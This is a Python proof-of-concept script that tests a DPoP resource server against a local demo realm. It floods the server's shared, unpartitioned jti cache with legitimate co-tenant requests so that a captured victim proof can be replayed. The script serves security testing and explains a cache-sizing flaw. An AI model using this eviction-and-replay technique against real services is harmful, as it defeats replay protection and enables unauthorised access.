"""
E2, quiet variant: cross-tenant eviction with no rejected request.

JTI_CACHE is private static final in JtiClaimValidator, so there is one cache per JVM,
shared by every client and every tenant served by that resource-server process. The cache
has no partition by client, token, or tenant.

Consequence: a high-traffic client's ordinary, fully legitimate, HTTP 200 traffic evicts a
low-traffic client's jti. No stolen credential, no forged proof, no rejected request. If
an attacker can generate honest load on the same node as a victim, the victim's captured
proof becomes replayable, and nothing in the logs distinguishes the eviction traffic from
normal use.

This probe uses a second legitimate client (its own key, its own token) making unique-jti
requests that all succeed. It is the same code path an unrelated busy tenant would exercise.

Expected: victim replay rejected before co-tenant traffic, admitted after, with the
co-tenant traffic returning only 200.
"""

import sys
import time
from pathlib import Path

import httpx

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "load"))
from dpop import DPoPKey, fetch_token  # noqa: E402

BASE = "http://localhost:8081"
URL = f"{BASE}/api/resource"
TOKEN_ENDPOINT = "http://localhost:8080/realms/dpop-demo/protocol/openid-connect/token"
N = 1000


def token_for():
    k = DPoPKey()
    t = fetch_token(TOKEN_ENDPOINT, k, "demo-client", "testuser", "testpass")["access_token"]
    return k, t


def main():
    victim_key, victim_token = token_for()
    cotenant_key, cotenant_token = token_for()

    results = []
    with httpx.Client(timeout=20.0) as client:
        captured = victim_key.proof("GET", URL, jti="victim-lowtraffic-proof",
                                    iat=int(time.time()), access_token=victim_token)
        r_first = client.get(URL, headers={
            "Authorization": f"DPoP {victim_token}", "DPoP": captured})
        results.append(("victim proof, first use", r_first.status_code, 200))

        r_pre = client.get(URL, headers={
            "Authorization": f"DPoP {victim_token}", "DPoP": captured})
        results.append(("victim replay before co-tenant traffic", r_pre.status_code, 401))

        # Co-tenant makes N legitimate, unique-jti, correctly bound requests. All 200.
        cotenant_status = {}
        t0 = time.monotonic()
        for i in range(N + 50):
            p = cotenant_key.proof("GET", URL, jti=f"cotenant-{i}",
                                   iat=int(time.time()), access_token=cotenant_token)
            s = client.get(URL, headers={
                "Authorization": f"DPoP {cotenant_token}", "DPoP": p}).status_code
            cotenant_status[s] = cotenant_status.get(s, 0) + 1
        secs = time.monotonic() - t0

        r_post = client.get(URL, headers={
            "Authorization": f"DPoP {victim_token}", "DPoP": captured})
        results.append((f"victim replay after {N}+ co-tenant 200s", r_post.status_code, 200))

    print("E2: cross-tenant eviction (quiet variant)")
    print(f"  co-tenant sent {N + 50} legitimate requests in {secs:.1f} s")
    print(f"  co-tenant response codes: {cotenant_status}")
    print()
    ok = True
    for label, got, want in results:
        verdict = "PASS" if got == want else "FAIL"
        if got != want:
            ok = False
        print(f"  {verdict}  {label:48s} expected {want}, got {got}")
    print()
    only_200 = set(cotenant_status) == {200}
    if results[-1][1] == 200 and only_200:
        print("  Victim replay ADMITTED after eviction driven entirely by HTTP 200 traffic.")
        print("  No rejected request, no forged proof, no stolen credential on the")
        print("  eviction path. The shared static cache has no tenant partition, so P in")
        print("  N >= P*W must be the AGGREGATE rate across every client on the node.")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
